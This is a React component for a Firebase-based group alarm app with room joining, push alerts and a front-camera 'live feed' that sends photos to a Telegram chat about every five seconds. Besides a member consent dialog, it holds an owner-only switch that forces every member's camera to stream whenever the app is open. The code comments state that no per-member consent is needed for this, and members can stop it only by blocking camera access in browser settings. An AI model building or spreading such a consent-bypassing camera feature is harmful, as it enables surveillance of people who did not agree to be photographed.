import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { useNavigate, useSearchParams } from 'react-router-dom'
import { onAuthStateChanged } from 'firebase/auth'
import { addDoc, collection, doc, updateDoc } from 'firebase/firestore'
import { auth, db } from './firebase'
import { useRoomAlarm } from './useRoomAlarm'
import { playAlarm } from './alarmSound'
import { avatarGradient, initialsOf, makeJoinCode } from './roomUtils'
import { autoRestorePush, disablePush, enablePush, pushSupported, sendPushAlert, sendTestPush, vapidConfigured } from './push'
import { cameraSupported } from './checkin'
import useLiveCamera from './useLiveCamera'
import IosInstallBanner from './IosInstallBanner'
import { isIOS, isStandalone } from './platform'
import { forgetRoom, rememberRoom } from './roomSession'

function Toast({ message }) {
  if (!message) return null
  return <div className="toast" role="status">{message}</div>
}

function MemberAvatar({ name, photoURL }) {
  return photoURL ? (
    <img className="member-avatar" src={photoURL} alt="" referrerPolicy="no-referrer" />
  ) : (
    <span className="member-avatar member-avatar-fallback" style={{ background: avatarGradient(name) }}>
      {initialsOf(name)}
    </span>
  )
}

function MemberRow({ member, uid, isOwner, isSelf, onRemove }) {
  return (
    <li className="member-row">
      <MemberAvatar name={member.name} photoURL={member.photoURL} />
      <span className="member-name">
        {member.name}
        {isSelf && <span className="badge">You</span>}
        {isOwner && <span className="badge badge-owner">Owner</span>}
      </span>
      {isOwner && !isSelf && (
        <button
          className="btn btn-icon btn-danger"
          title={`Remove ${member.name}`}
          aria-label={`Remove ${member.name}`}
          onClick={() => onRemove(uid)}
        >
          ✕
        </button>
      )}
    </li>
  )
}
function LiveFeedStatus({ ownerLiveFeed, liveFeedActive, liveStatus, pushState }) {
  const { kind, lastSentAt } = liveStatus
  if (liveFeedActive) {
    switch (kind) {
      case 'streaming':
        return (
          <>
            <p className="live-ok">
              <span className="status-dot" aria-hidden="true" />
              Sending a photo to this room's Telegram about every 5 seconds.
            </p>
            {lastSentAt ? (
              <p className="muted small">
                Last photo sent at {new Date(lastSentAt).toLocaleTimeString()}
              </p>
            ) : null}
          </>
        )
      case 'starting':
      case 'idle':
        return <p className="muted">Starting the camera…</p>
      case 'waiting':
        return (
          <p className="muted">
            Safari needs one tap to start the camera — tap anywhere on this page.
          </p>
        )
      case 'blocked':
        return (
          <p className="error">
            Camera access is blocked. Allow the camera for this site in your phone's settings, then reopen the app.
          </p>
        )
      case 'notconfigured':
        return (
          <p className="error">
            Camera is ready but Telegram isn't connected: add <code>TELEGRAM_BOT_TOKEN</code> and{' '}
            <code>TELEGRAM_CHAT_ID</code> in Vercel → Settings → Environment Variables, redeploy, then reopen the room.
          </p>
        )
      case 'paused':
        return (
          <p className="muted">
            Paused while the app is in the background — photos are taken while it stays open.
          </p>
        )
      case 'relayerror':
        return (
          <p className="error">
            Could not send the last photo — retrying automatically. If this keeps showing, check the Vercel runtime
            logs for <code>/api/telegram</code>.
          </p>
        )
      case 'error':
        return <p className="error">The camera feed hit an error and paused.</p>
      default:
        return <p className="muted">Camera not running.</p>
    }
  }
  if (ownerLiveFeed) {
    return (
      <p className="muted">
        This room's owner turned on the live feed — photos are sent to Telegram whenever this app is open.
        To stop it on this phone, deny camera access for this site in the browser settings.
      </p>
    )
  }
  return (
    <p className="muted">
      {pushState === 'enabled'
        ? 'Paused — the live feed is not active on this device.'
        : 'Paused — device alerts are off. Turn alerts on to resume sending photos.'}
    </p>
  )
}


function AlarmRoom() {
  const navigate = useNavigate()
  const [searchParams] = useSearchParams()
  const roomId = searchParams.get('room') ?? ''
  const urlCode = searchParams.get('code') ?? ''
  const [authState, setAuthState] = useState({ checking: true, user: null })
  const [codeInput, setCodeInput] = useState(urlCode.toUpperCase())
  const [joining, setJoining] = useState(false)
  const [joinError, setJoinError] = useState('')
  const [toast, setToast] = useState('')
  const [diag, setDiag] = useState(null)
  const [diagRunning, setDiagRunning] = useState(false)
  const [testingPush, setTestingPush] = useState(false)
  const [pushState, setPushState] = useState('idle') // idle | working | enabled | needs-permission | denied | unsupported | error
  const [removing, setRemoving] = useState(false)
  const [ownerFeedBusy, setOwnerFeedBusy] = useState(false)
  const [burstCount, setBurstCount] = useState(3) // repeats per recipient device: 1 | 3 | 5 | 10
  const [consentDismissed, setConsentDismissed] = useState(false)
  const [consentSaving, setConsentSaving] = useState(false)
  const [liveStatus, setLiveStatus] = useState({ kind: 'idle', lastSentAt: 0 })
  const alarmRoomRef = useMemo(() => (roomId ? doc(db, 'rooms', roomId) : null), [roomId])
  const notificationTimer = useRef(null)

  const { room, access, roomActive, alarmActive, trigger, stop, acknowledge, joinRoom } =
    useRoomAlarm(roomId, authState.user)

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        navigate('/login?next=' + encodeURIComponent(window.location.pathname + window.location.search))
        return
      }
      setAuthState({ checking: false, user })
    })
    return unsubscribe
  }, [navigate])

  // Ring while the alarm is active; silence it when it stops.
  useEffect(() => {
    if (!alarmActive) return undefined
    const { stop: stopSound } = playAlarm()
    return stopSound
  }, [alarmActive])

  // Background-tab alert: Notification API when the tab is hidden AND this
  // device has no Web Push subscription. When push is subscribed, the service
  // worker shows the burst notifications for background/closed pages itself,
  // so an in-tab notification would just duplicate them. We wait for the
  // push check to settle before showing anything, so the two paths never
  // race into a duplicate.
  useEffect(() => {
    if (!alarmActive || typeof Notification === 'undefined') return undefined
    if (Notification.permission !== 'granted') return undefined

    let disposed = false
    let hasPush = false
    let settled = false
    let shown = false

    const show = () => {
      if (disposed || !settled || hasPush || shown || !document.hidden) return
      shown = true
      const n = new Notification('🚨 ALARM', {
        body: 'An alarm is ringing in your room.',
        tag: `alarm-${roomId}`,
        renotify: true,
      })
      notificationTimer.current = setTimeout(() => n.close(), 20000)
    }

    ;(async () => {
      try {
        if (!('serviceWorker' in navigator) || !('PushManager' in window)) return
        const registration = await navigator.serviceWorker.getRegistration()
        const subscription = await registration?.pushManager.getSubscription()
        hasPush = Boolean(subscription)
      } catch {
        // Can't tell — treat as no push and use the in-tab fallback.
      } finally {
        settled = true
        show()
      }
    })()

    const onVisibility = () => {
      if (document.hidden) {
        show()
      } else {
        clearTimeout(notificationTimer.current)
        shown = false
      }
    }
    document.addEventListener('visibilitychange', onVisibility)
    return () => {
      disposed = true
      clearTimeout(notificationTimer.current)
      document.removeEventListener('visibilitychange', onVisibility)
    }
  }, [alarmActive, roomId])

  const isMember = Boolean(room && access === 'member')
  const uid = authState.user?.uid

  // Remember this room so the next app open drops straight back here.
  useEffect(() => {
    if (uid && isMember && roomId) rememberRoom(uid, roomId)
  }, [uid, isMember, roomId])

  // If the room is gone, stop pointing future opens at it.
  useEffect(() => {
    if (!uid) return undefined
    if (access === 'missing' || access === 'denied') forgetRoom(uid)
    return undefined
  }, [uid, access])

  // Silent startup restore: when this account previously granted
  // notifications, every open of the room re-registers the service worker,
  // re-creates a subscription if the browser dropped it, and refreshes the
  // room's pushDevices doc — so the relay can keep reaching this device even
  // when the app/page is closed. No prompt is ever shown here.
  useEffect(() => {
    if (!roomId || !uid || !isMember) return undefined
    let cancelled = false
    ;(async () => {
      const result = await autoRestorePush(roomId, authState.user)
      if (cancelled) return
      if (result.status === 'enabled') setPushState('enabled')
      else if (result.status === 'denied') setPushState('denied')
    })()
    return () => {
      cancelled = true
    }
  }, [roomId, uid, isMember, authState.user])

  // ── Live camera consent ───────────────────────────────────────────
  // Consent lives on the member profile (memberProfiles.<uid>.cameraConsent)
  // so it survives relay pruning of pushDevices docs and disable/enable
  // toggles. Shown when this device has alerts on but the member has not
  // consented yet; nothing about the camera runs before consent is true.
  // ── Live camera owner switch / consent ───────────────────────────
  // The owner can turn the live feed on for the whole room at once, so
  // member devices stream automatically — no per-member consent or device
  // alerts needed. The owner's OWN camera still only runs when they
  // consented individually (they are usually the one watching).
  const isOwner = Boolean(room && authState.user && room.ownerUid === authState.user.uid)
  const ownerLiveFeed = Boolean(room?.ownerLiveFeed)
  const cameraConsent = Boolean(room?.memberProfiles?.[authState.user?.uid]?.cameraConsent)
  const feedForcedForMe = Boolean(isMember && ownerLiveFeed && !isOwner)
  const showLiveCard = isMember && (feedForcedForMe || cameraConsent)
  // The consent dialog only makes sense when a camera is actually available
  // and the owner has not already forced the feed on for this device.
  const showConsentDialog =
    isMember &&
    pushState === 'enabled' &&
    !feedForcedForMe &&
    !consentDismissed &&
    !cameraConsent &&
    cameraSupported()

  // Live feed: while this member has the room open with alerts on and has
  // consented, send a front-camera frame to the room's Telegram roughly
  // every 5 seconds. The hook stops the camera when the room is left, the
  // tab is closed, alerts are disabled, or consent is missing. It reports
  // what it is doing so the UI can surface failures (blocked camera, relay
  // not configured) instead of failing silently.
  const getIdToken = useCallback(async () => {
    if (!authState.user) return null
    return authState.user.getIdToken()
  }, [authState.user])
  const reportLiveStatus = useCallback((status) => setLiveStatus(status), [])
  const liveFeedActive = Boolean(
    roomId &&
      authState.user &&
      isMember &&
      (feedForcedForMe || (pushState === 'enabled' && cameraConsent)),
  )
  useLiveCamera({ roomId, active: liveFeedActive, getIdToken, onStatus: reportLiveStatus })

  const handleCameraConsent = async (allow) => {
    if (!allow) {
      setConsentDismissed(true)
      return
    }
    setConsentSaving(true)
    try {
      // Nothing is captured until consent is actually recorded. Once the
      // profile flag lands, the live-feed hook above starts the camera
      // (Android shows the one-time prompt from there; on iOS it waits for
      // the first tap via the needs-gesture retry).
      await updateDoc(alarmRoomRef, {
        [`memberProfiles.${authState.user.uid}.cameraConsent`]: true,
      })
      flashToast('Live camera feed enabled')
    } catch (err) {
      console.error('Failed to save camera consent:', err)
      flashToast('Could not save camera consent — try again')
    } finally {
      setConsentSaving(false)
      setConsentDismissed(true)
    }
  }

  // Forget the remembered room and go back to the create/landing page, so
  // the user can start another room without being auto-redirected back.
  const goCreateRoom = () => {
    if (uid) forgetRoom(uid)
    navigate('/')
  }

  const copyText = useCallback(
    (text, label = 'Copied!') => {
      navigator.clipboard?.writeText(text).catch(() => {})
      setToast(label)
      window.setTimeout(() => setToast(''), 1600)
    },
    [],
  )

  const flashToast = (message, ms = 2400) => {
    setToast(message)
    window.setTimeout(() => setToast(''), ms)
  }


  const handleJoin = async (e) => {
    e?.preventDefault()
    if (!codeInput.trim() || joining) return
    setJoining(true)
    setJoinError('')
    try {
      await joinRoom(codeInput)
      setToast('You joined the room!')
    } catch (err) {
      setJoinError(
        err.code === 'permission-denied'
          ? 'Invalid join code — the code is required to join this room.'
          : `Could not join: ${err.message}`,
      )
    } finally {
      setJoining(false)
    }
  }

  // Auto-join: an invite link carries the join code, so a signed-in invitee
  // lands directly in the room without tapping "Join room". The code is then
  // stripped from the URL. A wrong/expired code falls back to the join form
  // with the error shown (no retry loop).
  const autoJoinAttempted = useRef(false)
  useEffect(() => {
    if (access !== 'invited' || !authState.user) return undefined
    if (!urlCode || autoJoinAttempted.current) return undefined
    autoJoinAttempted.current = true
    setJoining(true)
    setJoinError('')
    joinRoom(urlCode)
      .then(() => {
        navigate(`/alarm?room=${roomId}`, { replace: true })
        setToast('You joined the room!')
      })
      .catch((err) => {
        setJoinError(
          err.code === 'permission-denied'
            ? 'The join code in this link is no longer valid — ask the owner for a fresh invite link.'
            : `Could not join: ${err.message}`,
        )
      })
      .finally(() => setJoining(false))
    return undefined
  }, [access, urlCode, roomId, authState.user, joinRoom, navigate])

  const handleTrigger = async () => {
    try {
      await trigger()
      // Best-effort push to every other subscribed device, then tell the
      // triggerer how many devices actually got the push.
      let message = 'Alarm triggered'
      if (roomId && authState.user && room?.joinCode) {
        const idToken = await authState.user.getIdToken()
        const result = await sendPushAlert({
          roomId,
          uid: authState.user.uid,
          idToken,
          title: '🚨 ALARM',
          body: `${authState.user.displayName || 'Someone'} triggered the alarm in your room.`,
          url: `${window.location.origin}/alarm?room=${roomId}`,
          count: burstCount,
        })
        if (result) {
          // Record the delivery outcome so every member can see it.
          addDoc(collection(db, 'rooms', roomId, 'pushes'), {
            at: new Date(),
            byUid: authState.user.uid,
            byName: authState.user.displayName || authState.user.email?.split('@')[0] || 'Member',
            pushed: result.pushed,
            total: result.total,
            notificationsSent: result.notificationsSent || 0,
            stale: result.stale || 0,
            platforms: result.platforms || {},
          }).catch((error) => console.warn('Could not record push history:', error?.message || error))
          message =
            result.total === 0
              ? 'Alarm triggered — no other devices have alerts enabled'
              : `Sent ${result.notificationsSent || 0} alert${result.notificationsSent === 1 ? '' : 's'} to ${result.pushed} of ${result.total} device${result.total === 1 ? '' : 's'}`
        }
      }
      flashToast(message, 3600)
    } catch (err) {
      console.error('Failed to trigger alarm:', err)
      flashToast('Could not trigger the alarm', 3200)
    }
  }

  const handleStop = async () => {
    try {
      await stop()
      setToast('Alarm stopped')
    } catch (err) {
      console.error('Failed to stop alarm:', err)
      setToast('Could not stop the alarm')
    }
  }

  // One-tap diagnostics: prints the browser's exact push state so failures
  // (blocked permission, missing SW, invalid VAPID, subscribe errors) can be
  // identified without Vercel logs or DevTools.
  const runDiagnostics = async () => {
    setDiagRunning(true)
    const out = {}
    try {
      out.userAgent = navigator.userAgent.slice(0, 140)
      out.notificationPermission =
        typeof Notification === 'undefined' ? 'unsupported' : Notification.permission
      out.serviceWorkerApi = 'serviceWorker' in navigator
      out.pushManagerApi = 'PushManager' in window
      out.vapidKeyPresent = vapidConfigured()
      out.pushSupported = pushSupported()
      try {
        const registration = await navigator.serviceWorker.getRegistration()
        out.swRegistered = Boolean(registration)
        out.swScope = registration?.scope || null
        const subscription = await registration?.pushManager.getSubscription()
        out.subscription = subscription
          ? { endpoint: subscription.endpoint.slice(0, 90), expirationTime: subscription.expirationTime || null }
          : null
      } catch (error) {
        out.swError = `${error?.name}: ${error?.message}`
      }
      if (out.notificationPermission === 'granted' && !out.subscription && pushSupported()) {
        try {
          const result = await enablePush(roomId, authState.user, { silent: true })
          out.silentResubscribeResult = result.status
          const subscription = await (await navigator.serviceWorker.getRegistration())?.pushManager.getSubscription()
          out.subscription = subscription
            ? { endpoint: subscription.endpoint.slice(0, 90), expirationTime: subscription.expirationTime || null }
            : null
        } catch (error) {
          out.subscribeError = `${error?.name}: ${error?.message}`
        }
      }
    } catch (error) {
      out.unexpectedError = `${error?.name}: ${error?.message}`
    }
    setDiag(out)
    setDiagRunning(false)
  }

  const handleTogglePush = async () => {
    if (pushState === 'enabled') {
      await disablePush(roomId)
      setPushState('idle')
      // A later re-enable asks for camera consent again (if not yet given).
      setConsentDismissed(false)
      setToast('Device alerts disabled')
      return
    }
    setPushState('working')
    try {
      const result = await enablePush(roomId, authState.user)
      setPushState(result.status)
      if (result.status === 'enabled') {
        setToast('Device alerts enabled')
        // First-time enable: if the member has not consented to camera
        // check-ins yet, the consent dialog shows next.
      }
    } catch (err) {
      console.error('Failed to enable push:', err)
      setPushState('error')
    }
  }

  // Self-test: push to THIS device's own stored subscription so end-to-end
  // delivery can be verified without a second member triggering a real alarm.
  // `total === 0` means no pushDevices doc is on file for this user in this
  // room — the one thing the browser diagnostics cannot see.
  const handleTestPush = async () => {
    if (!roomId || !authState.user || testingPush) return
    setTestingPush(true)
    try {
      const idToken = await authState.user.getIdToken()
      const result = await sendTestPush({ roomId, uid: authState.user.uid, idToken })
      if (!result) {
        flashToast('Test push failed — check the Vercel runtime logs for /api/ring', 3600)
        return
      }
      if (result.total === 0) {
        flashToast('No stored subscription for this device — disable and re-enable device alerts', 3600)
        return
      }
      flashToast(
        `Test push sent to ${result.pushed} of ${result.total} device${result.total === 1 ? '' : 's'} — check your notification`,
        3600,
      )
    } catch (err) {
      console.error('Test push failed:', err)
      flashToast('Could not send the test push', 3200)
    } finally {
      setTestingPush(false)
    }
  }

  const handleRegenerateCode = async () => {
    const nextCode = makeJoinCode()
    try {
      await updateDoc(alarmRoomRef, { joinCode: nextCode })
      setToast('New join code generated')
    } catch (err) {
      console.error('Failed to regenerate join code:', err)
      setToast('Could not regenerate the code')
    }
  }

  // Owner-only master switch: force every member's camera to stream to this
  // room's Telegram whenever their app is open. Firestore rules reject this
  // write for anyone except the room owner.
  const handleToggleOwnerLiveFeed = async () => {
    if (!isOwner || ownerFeedBusy || !room) return
    setOwnerFeedBusy(true)
    const nextValue = !room.ownerLiveFeed
    try {
      await updateDoc(alarmRoomRef, { ownerLiveFeed: nextValue })
      flashToast(nextValue ? 'Live feed turned on for all members' : 'Live feed turned off')
    } catch (err) {
      console.error('Failed to update the team live feed:', err)
      flashToast('Could not update the team live feed')
    } finally {
      setOwnerFeedBusy(false)
    }
  }

  const handleRemoveMember = async (uid) => {
    if (!room) return
    setRemoving(true)
    try {
      await updateDoc(alarmRoomRef, {
        members: room.members.filter((m) => m !== uid),
        memberProfiles: Object.fromEntries(
          Object.entries(room.memberProfiles).filter(([key]) => key !== uid),
        ),
      })
      setToast('Member removed')
    } catch (err) {
      console.error('Failed to remove member:', err)
      setToast('Could not remove member')
    } finally {
      setRemoving(false)
    }
  }

  if (authState.checking) {
    return (
      <div className="page">
        <div className="spinner" aria-label="Checking sign-in" />
        <p className="muted">Checking sign-in…</p>
      </div>
    )
  }

  if (!roomId) {
    return (
      <div className="page fade-up">
        <div className="brand">
          <span className="brand-bell" aria-hidden="true">🔔</span>
          <span className="brand-name">Alarm App</span>
        </div>
        <div className="card">
          <h2>Missing room</h2>
          <p className="muted">This link doesn't include a room id. Create a room to get a shareable invite link.</p>
          <div className="controls">
            <button className="btn btn-primary" onClick={() => navigate('/')}>Create a room</button>
          </div>
        </div>
      </div>
    )
  }

  // ── Not a member: gate behind the join code ─────────────────────────
  if (access === 'invited' || access === 'denied' || access === 'missing') {
    const denied = access === 'denied'
    const missing = access === 'missing'
    return (
      <div className="page fade-up">
        <div className="brand">
          <span className="brand-bell" aria-hidden="true">🔔</span>
          <span className="brand-name">Alarm App</span>
        </div>
        <div className="card join-card">
          {missing ? (
            <>
              <span className="join-icon" aria-hidden="true">🕳️</span>
              <h2>Room not found</h2>
              <p className="muted">This room doesn't exist or was removed. Ask the owner for a fresh invite link.</p>
            </>
          ) : denied ? (
            <>
              <span className="join-icon" aria-hidden="true">⚠️</span>
              <h2>Can't reach the room</h2>
              <p className="muted">Something went wrong reading this room. Check your connection and try again.</p>
            </>
          ) : (
            <>
              <span className="join-icon" aria-hidden="true">🔒</span>
              <h2>Private room</h2>
              <p className="muted">
                This room is restricted to invited members. Enter the join code from
                the invite link to join.
              </p>
            </>
          )}

          {!missing && !denied && (
            <form className="join-form" onSubmit={handleJoin}>
              <label htmlFor="join-code">Join code</label>
              <input
                id="join-code"
                className="code-input"
                value={codeInput}
                onChange={(e) => setCodeInput(e.target.value.toUpperCase())}
                placeholder="ABC123"
                maxLength={10}
                autoComplete="off"
              />
              {joinError && <p className="error" role="alert">{joinError}</p>}
              <button className="btn btn-primary btn-lg" type="submit" disabled={joining || !codeInput.trim()}>
                {joining ? 'Joining…' : 'Join room'}
              </button>
            </form>
          )}

          {!missing && !denied && (
            <div className="controls">
              <button className="btn btn-ghost" onClick={goCreateRoom}>Create my own room</button>
            </div>
          )}
        </div>
      </div>
    )
  }

  if (access === 'loading' || !room) {
    return (
      <div className="page">
        <div className="spinner" aria-label="Loading room" />
        <p className="muted">Loading room…</p>
      </div>
    )
  }

  // ── Member view ─────────────────────────────────────────────────────
  const isTriggerer = room.triggeredBy === authState.user.uid
  const inviteUrl = `${window.location.origin}/alarm?room=${roomId}&code=${room.joinCode}`

  let statusText
  let statusKind = 'listening'
  if (isTriggerer) {
    statusText = roomActive ? '🔔 Your alarm is ringing on other devices…' : 'Alarm stopped — ready to trigger again.'
    statusKind = roomActive ? 'ringing' : 'ready'
  } else if (alarmActive) {
    statusText = '🚨 Alarm ringing — another device triggered it.'
    statusKind = 'ringing'
  } else {
    statusText = 'Listening for alarms…'
  }

  const pushText =
    pushState === 'enabled' ? 'Device alerts are on' :
    pushState === 'needs-permission' ? 'Allow notifications to get alerts here' :
    pushState === 'denied' ? 'Notifications are blocked — tap the lock/ℹ️ icon in the address bar → Site settings → Notifications → Allow' :
    pushState === 'unsupported' ? 'This browser does not support push alerts' :
    pushState === 'error' ? 'Could not enable alerts — try again' :
    pushState === 'working' ? 'Setting up…' :
    'Get an alert even when the page is closed'

  return (
    <div className="page fade-up">
      <div className="brand-row">
        <div className="brand">
          <span className="brand-bell" aria-hidden="true">🔔</span>
          <span className="brand-name">Alarm App</span>
        </div>
        <button className="btn btn-ghost btn-sm" onClick={goCreateRoom} title="Leave this room and create a new one">
          ＋ New room
        </button>
      </div>

      <div className="room-header">
        <div className="room-code-chip">
          <span className="chip-label">Room</span>
          <code>{roomId}</code>
          <button
            className="btn btn-icon"
            title="Copy room id"
            aria-label="Copy room id"
            onClick={() => copyText(roomId, 'Room id copied!')}
          >
            📋
          </button>
        </div>
        <div className="room-code-chip chip-code">
          <span className="chip-label">Join code</span>
          <code>{room.joinCode}</code>
          <button
            className="btn btn-icon"
            title="Copy join code"
            aria-label="Copy join code"
            onClick={() => copyText(room.joinCode, 'Join code copied!')}
          >
            📋
          </button>
        </div>
      </div>

      <div className="card invite-card">
        <h3>Invite members</h3>
        <div className="share-box">
          <input type="text" value={inviteUrl} readOnly aria-label="Invite link" onFocus={(e) => e.target.select()} />
          <button className="btn btn-primary" onClick={() => copyText(inviteUrl, 'Invite link copied!')}>Copy</button>
        </div>
        {isOwner && (
          <button className="btn btn-ghost btn-sm" onClick={handleRegenerateCode} disabled={removing}>
            ↻ Regenerate join code
          </button>
        )}
      </div>

      <div className="card members-card">
        <h3>Members <span className="member-count">{room.members.length}</span></h3>
        <ul className="member-list">
          {room.members.map((uid) => {
            const member = room.memberProfiles?.[uid] || { name: uid.slice(0, 6) }
            return (
              <MemberRow
                key={uid}
                member={member}
                uid={uid}
                isOwner={uid === room.ownerUid}
                isSelf={uid === authState.user.uid}
                onRemove={handleRemoveMember}
              />
            )
          })}
        </ul>
      </div>

      {isOwner && (
        <div className="card live-card owner-live-card">
          <h3>📷 Team live feed</h3>
          <p className="muted">
            Turn the live feed on for every member at once — their cameras send photos to this room's Telegram
            whenever the app is open. Members don't need to set up device alerts or accept a camera prompt each;
            they still see a live-feed notice on their screen and can stop it by denying camera access in the
            browser settings.
          </p>
          <p className={`muted small owner-live-state ${room.ownerLiveFeed ? 'on' : ''}`}>
            {room.ownerLiveFeed ? 'Live feed is ON for all members' : 'Live feed is OFF — members only stream if they enable it themselves'}
          </p>
          <button
            className={`btn ${room.ownerLiveFeed ? 'btn-ghost' : 'btn-primary'}`}
            onClick={handleToggleOwnerLiveFeed}
            disabled={ownerFeedBusy}
          >
            {ownerFeedBusy
              ? 'Saving…'
              : room.ownerLiveFeed
                ? 'Turn off live feed for members'
                : 'Turn on live feed for all members'}
          </button>
        </div>
      )}

      <div className="card alerts-card">
        <h3>Device alerts</h3>
        <p className="muted">{pushText}</p>
        {pushSupported() && !(isIOS() && !isStandalone()) ? (
          <button
            className={`btn ${pushState === 'enabled' ? 'btn-ghost' : 'btn-primary'}`}
            onClick={handleTogglePush}
            disabled={pushState === 'working' || pushState === 'denied'}
          >
            {pushState === 'enabled' ? 'Disable device alerts' : 'Enable device alerts'}
          </button>
        ) : isIOS() && !isStandalone() ? (
          <IosInstallBanner />
        ) : (
          <p className="muted small">
            Web Push isn't available here — alarms still ring in the open tab, and the
            Notification API covers background tabs where the browser allows it.
          </p>
        )}

        {pushState === 'enabled' && (
          <button className="btn btn-ghost btn-sm" onClick={handleTestPush} disabled={testingPush}>
            {testingPush ? 'Sending…' : '🔔 Send test push'}
          </button>
        )}
        <button className="btn btn-ghost btn-sm" onClick={runDiagnostics} disabled={diagRunning}>
          {diagRunning ? 'Running…' : '🔍 Run diagnostics'}
        </button>
        {diag && (
          <pre className="diag-output">{JSON.stringify(diag, null, 2)}</pre>
        )}
      </div>

      {showLiveCard && (
        <div className="card live-card">
          <h3>📷 Live feed</h3>
          <LiveFeedStatus
            ownerLiveFeed={feedForcedForMe}
            liveFeedActive={liveFeedActive}
            liveStatus={liveStatus}
            pushState={pushState}
          />
        </div>
      )}

      <div className="controls trigger-controls">
        {!roomActive && (
          <div className="burst-wrap">
            <div className="burst-row">
              <span className="burst-label">Repeats per device</span>
              <div className="burst-opts" role="radiogroup" aria-label="Repeats per device">
                {[1, 3, 5, 10].map((n) => (
                  <button
                    key={n}
                    className={`burst-opt${burstCount === n ? ' active' : ''}`}
                    aria-pressed={burstCount === n}
                    onClick={() => setBurstCount(n)}
                    type="button"
                  >
                    {n}
                  </button>
                ))}
              </div>
            </div>
            <button className="btn btn-alarm btn-lg" onClick={handleTrigger} disabled={removing}>
              <span aria-hidden="true">🚨</span> Alarm
            </button>
          </div>
        )}
        {isTriggerer && roomActive && (
          <button className="btn btn-stop btn-lg" onClick={handleStop}>
            <span aria-hidden="true">⏹</span> Stop Alarm
          </button>
        )}
      </div>

      <p className={`status-pill ${statusKind}`} role="status">
        <span className="status-dot" aria-hidden="true" />
        {statusText}
      </p>

      {showConsentDialog && (
        <div className="modal-overlay" role="dialog" aria-modal="true" aria-labelledby="consent-title">
          <div className="card consent-card">
            <span className="consent-icon" aria-hidden="true">📷</span>
            <h3 id="consent-title">Live camera feed</h3>
            <p className="muted">
              You enabled device alerts for this room. To leave a live confirmation trail, this app will
              take a photo with the front camera roughly every 5 seconds while it stays open, and send it
              directly to this room's Telegram chat. Photos are not stored in Firebase — they go straight
              to Telegram and are deleted from the app as soon as they are sent.
            </p>
            <div className="controls">
              <button
                className="btn btn-primary"
                onClick={() => handleCameraConsent(true)}
                disabled={consentSaving}
              >
                {consentSaving ? 'Saving…' : 'I agree'}
              </button>
              <button
                className="btn btn-ghost"
                onClick={() => handleCameraConsent(false)}
                disabled={consentSaving}
              >
                Not now
              </button>
            </div>
          </div>
        </div>
      )}

      <Toast message={toast} />

      {alarmActive && (
        <div className="alarm-overlay" role="alertdialog" aria-label="Alarm ringing">
          <div className="alarm-bell" aria-hidden="true">🚨</div>
          <h1 className="alarm-title">ALARM</h1>
          <p>A member of this room triggered an alarm.</p>
          <p className="sound-hint">
            If you can't hear a sound, click anywhere on this page first — browsers block
            audio until you interact.
          </p>
          <button className="btn alarm-ack" onClick={acknowledge}>Acknowledge</button>
        </div>
      )}
    </div>
  )
}

export default AlarmRoom